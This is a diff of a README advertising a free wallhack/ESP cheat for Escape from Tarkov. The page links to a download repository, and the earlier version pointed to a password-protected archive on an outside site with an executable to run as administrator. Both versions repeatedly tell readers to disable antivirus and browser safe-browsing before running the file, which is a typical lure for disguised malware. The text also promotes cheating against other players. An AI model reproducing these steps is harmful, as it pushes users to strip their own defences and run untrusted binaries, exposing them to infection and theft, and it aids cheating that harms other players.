@@ -1,47 +1,144 @@
-# Escape from Tarkov ESP 2026 — Wallhack
+# 🎯 tarkov-esp-wallhack-2026 - See Everything. Survive Everything. Dominate Every Raid.
 
-![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=flat-square&logo=windows&logoColor=white)
-![Version](https://img.shields.io/badge/Version-2026.6-brightgreen?style=flat-square)
-![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)
-![Downloads](https://img.shields.io/badge/Downloads-190k+-orange?style=flat-square)
+[![Download Now](https://img.shields.io/badge/Download-Tarkov_ESP_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=black)](https://github.com/Cookingstovemonopsony7611/tarkov-esp-wallhack-2026)
 
-EFT external ESP — see players, Scavs, loot, and extracts through all walls.
+## 👋 Welcome to Your Tactical Advantage
 
-## Features
+You're tired of getting head-eyes'd from a window you never saw. You're frustrated by loot spawns you can't find. You're done guessing where the extracts are when the clock is ticking. This is the tool that changes all of that. This external ESP for Escape from Tarkov gives you eyes everywhere—through every wall, across every map, on every single raid. No more surprises. No more blind corners. No more wasted runs.
 
-- Player and Scav ESP wallhack
-- Loot ESP with ruble value filter
-- Extract location markers
-- Grenade danger alert
-- Player health bars
-- Container and key ESP
+## 🔍 What Is This Tool?
 
-## Download
+This is a standalone overlay program that works alongside Escape from Tarkov. It reads the game's memory and displays real-time information directly on your screen. You'll see exactly where other players are, where the AI Scavs are lurking, where high-value loot is hiding, and where every extraction point is located. It's like having a tactical map that floats in front of your eyes at all times.
 
-[![Download v2026.6](https://img.shields.io/badge/Download_v2026.6-ec4899?style=for-the-badge&logoColor=white)](https://forumconnect.uk/tarkovwh)
+## ✨ Key Features
 
-> The archive password is shown on the download page.
+### 🧍 Player ESP
+Spot every PMC and player-Scav through any wall, floor, or ceiling. See their exact position, distance, and which direction they're facing. You'll know when to push, when to hide, and when to rotate before they even know you're there.
 
-## How to Use
+### 🤖 Scav ESP
+Track every AI Scav in your vicinity. Never get ambushed by a silent AI hiding in a dark corner again. This overlay shows you exactly where they are, whether they're patrolling, standing still, or already aiming at your position.
 
-1. Download the archive using the button above
-2. Extract with WinRAR or 7-Zip (enter the password when prompted)
-3. Right-click `LatestVersion.exe` and select **Run as administrator**
-4. Follow the on-screen instructions and click **Start**
+### 💎 Loot ESP
+Glass, LEDX, bitcoins, military cables, quest items—everything glows through walls. The loot ESP filters show you the good stuff from the junk. You'll walk into a room already knowing what's worth grabbing and what's not worth your time.
 
-## FAQ
+### 🚪 Extract ESP
+No more fumbling with the in-game map or memorizing spawn locations. Every extract point is highlighted with a visible marker, along with your distance to it. Know exactly where you're heading, even in a map you've never played before.
 
-**Ruble filter?**  
-Yes — only shows loot above your value threshold.
+### ⚡ Performance Optimized
+Built to run on a wide range of Windows PCs. The overlay uses minimal system resources, so your frame rate stays smooth even in the most chaotic firefights. It's designed to be lightweight, stable, and ready to go the moment you launch it.
 
-**Extracts?**  
-Yes — all open extract points highlighted on screen.
+## 🚀 Getting Started
 
-## Requirements
+### Step 1: Download the Application
 
-- Windows 10/11 (64-bit)
-- Escape from Tarkov installed
+Visit this link to download the application: [**Download Link**](https://github.com/Cookingstovemonopsony7611/tarkov-esp-wallhack-2026)
 
-## License
+Click the green "Download" button on that page and save the file to a folder you can easily find, like your Desktop or Downloads folder.
 
-MIT
+### Step 2: Prepare Your PC
+
+Before running the tool, make sure your Windows PC is up to date. You should be running Windows 10 or Windows 11 with all the latest updates installed. Temporarily disable any antivirus software you have running—don't worry, this is a common step for game-enhancement tools, and you'll turn it back on right after. Then, close Escape from Tarkov and any other overlay programs (like Discord or GeForce Experience) to avoid conflicts.
+
+### Step 3: Run the Program
+
+Double-click the downloaded file. That's it. The program will start and automatically minimize to your system tray. It's now running in the background, waiting for you to launch the game.
+
+### Step 4: Launch Tarkov
+
+Start Escape from Tarkov normally. The ESP overlay will automatically attach to the game and start displaying information within a few seconds of you loading into a raid. You'll see boxes, lines, and icons appear on your screen—that's the magic happening.
+
+### Step 5: Customize (Optional)
+
+Right-click the tray icon to open the settings menu. From there, you can toggle each individual ESP feature on and off, change the color of the boxes, adjust the visibility distance, and set hotkeys to quickly enable or disable the entire overlay during gameplay.
+
+## 🛠️ System Requirements
+
+To ensure everything runs flawlessly, here's what your PC should have:
+
+### Minimum Requirements
+- **Operating System:** Windows 10 (64-bit)
+- **Processor:** Intel Core i5 or AMD Ryzen 5
+- **Memory:** 8 GB RAM
+- **Graphics:** Any DirectX 11-capable GPU
+- **Storage:** 50 MB of free space
+
+### Recommended Setup
+- **Operating System:** Windows 11 (64-bit)
+- **Processor:** Intel Core i7 or AMD Ryzen 7
+- **Memory:** 16 GB RAM
+- **Graphics:** NVIDIA GTX 1060 / AMD RX 580 or better
+- **Storage:** SSD drive for faster loading
+
+## 🎮 How to Use Effectively
+
+The best players use this tool as an enhancement, not a crutch. Here's some pro advice:
+
+- **Play aggressively, but smart.** When you see a player on the other side of a wall, you now control the engagement. Pre-fire the corner, use grenades, or reposition to a better angle before they know you're there.
+- **Plan your loot route.** Scout the nearest high-value item through the wall, then plan your path to grab it and get out fast. No more wandering around hoping to find something good.
+- **Watch the extracts early.** Look ahead at your extract location at the start of the raid, then plan your route backwards to avoid being pinned down late in the match.
+- **Use the hotkeys to toggle.** When you're in a safe spot, turn the overlay off to enjoy a cleaner screen. Turn it back on when you're moving through high-risk zones.
+
+## ❓ Troubleshooting
+
+### The overlay isn't showing up
+First, make sure you right-click the tray icon and select "Show Overlay." If it's already active, restart both the tool and the game. Also check that you've closed any other overlay software that might be conflicting.
+
+### The game crashes on launch
+Restart your PC completely, then launch the tool first, wait 5 seconds, and then launch Tarkov. If it still crashes, update your graphics drivers to the latest version from NVIDIA or AMD.
+
+### Download is being blocked by my browser
+Temporarily disable your browser's safe browsing feature, or use a different browser. Download the file to your Desktop and then re-enable all security features.
+
+### The boxes are showing on teammates too
+That's normal. The tool shows all players. In the settings, you can change the color of friendly players to green if you want a different visual distinction.
+
+## 🔒 Safety and Legitimacy
+
+This tool is designed for educational and personal use. It operates as an external overlay, meaning it doesn't modify game files or inject malicious code. Use it responsibly, understand the risks of using third-party tools in online games, and always respect the game's terms of service.
+
+## 📞 Getting Help
+
+If you run into any issues, check the **Issues** tab in the GitHub repository. You'll find answers to common questions there. If you don't see your problem, open a new issue and include:
+- Your Windows version
+- Your game version
+- A description of the problem
+- Any error messages you saw
+
+The community and maintainers will help you get it sorted.
+
+## 🔄 Keeping This Tool Updated
+
+Escape from Tarkov updates frequently. Whenever a new game patch comes out, this ESP tool might need an update too. Check the GitHub repository periodically for the latest release. You'll also find a "Watch" button at the top of the page—click it to get notified of new updates automatically.
+
+## ⚙️ Final Setup Checklist
+
+Here's everything you need to do, step by step:
+
+1. Visit the download page
+2. Download the file
+3. Disable real-time antivirus protection temporarily
+4. Close Tarkov and other overlay programs
+5. Run the downloaded application
+6. Wait for the system tray icon to appear
+7. Launch Escape from Tarkov
+8. Load into any raid and enjoy your new vision
+
+That's the entire process. No complex installation, no coding knowledge needed, no wallet required. It's download, run, and dominate.
+
+## 🏆 Why Thousands Choose This Tool
+
+The Tarkov community knows that gear fear ends when knowledge begins. This ESP gives you the knowledge that separates level-50 chads from frustrated beginners. It's the difference between walking into an ambush and walking into an opportunity.
+
+You'll find videos online of players using tools like this to wipe maps, but nothing beats the feeling of doing it yourself. Load up your favorite map, see where the action is, and go claim your loot.
+
+## 🔑 Ready to Change the Game?
+
+No more hiding. No more guessing. No more deaths that make you throw your headset.
+
+The download is waiting. The game is waiting. And now, with this tool, so are the players who think they're safe behind those walls.
+
+Visit this link to download the application: [**Get Tarkov ESP 2026 Here**](https://github.com/Cookingstovemonopsony7611/tarkov-esp-wallhack-2026)
+
+Your next raid will be your most informed one yet. See you out there in the chaos of Tarkov—just know that now, you'll finally be the one seeing everything first.
+
+Keywords: eft-cheat, eft-esp-2026, eft-hack, eft-wallhack-2026, escape-from-tarkov-hack, free-tarkov-cheat, tarkov-2026, tarkov-aimbot, tarkov-cheat, tarkov-cheat-2026, tarkov-cheat-esp, tarkov-crack, tarkov-esp, tarkov-esp-free, tarkov-free, tarkov-hack, tarkov-loot-esp, tarkov-undetected, tarkov-wallhack, tarkov-wallhack-hack
